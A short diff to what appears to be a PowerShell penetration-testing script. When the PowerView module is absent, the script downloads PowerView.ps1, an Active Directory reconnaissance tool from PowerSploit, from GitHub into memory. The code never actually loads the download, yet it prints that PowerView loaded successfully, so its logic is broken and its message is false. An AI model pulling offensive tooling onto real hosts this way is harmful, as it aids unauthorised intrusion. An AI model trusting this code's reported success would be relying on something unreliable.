@@ -79,7 +79,8 @@ if (-not (Get-Help Get-DomainUser)) {
     Write-Output "PowerView module not found, downloading into memory..."
     try {
         $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
-        $pwContent.Content 
+        $pwContent
+        #$pwContent.Content 
         Write-Output "PowerView loaded successfully"
     } catch {
         Write-Output "Could not download PowerView: $($_.Exception.Message)"
